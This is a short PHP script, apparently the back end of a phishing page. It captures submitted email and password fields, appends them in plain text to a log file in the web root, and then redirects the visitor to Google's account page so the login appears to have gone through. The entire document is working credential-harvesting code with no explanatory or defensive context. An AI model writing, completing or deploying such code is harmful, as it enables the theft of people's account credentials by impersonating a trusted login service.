<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $file = fopen("/var/www/html/log.txt", "a");
    fwrite($file, "EMAIL: " . $email . "\n");
    fwrite($file, "PASSWORD: " . $password . "\n");
    fwrite($file, "-----------------------------\n");
    fclose($file);
    header("Location: https://accounts.google.com");
    exit();
}
?>
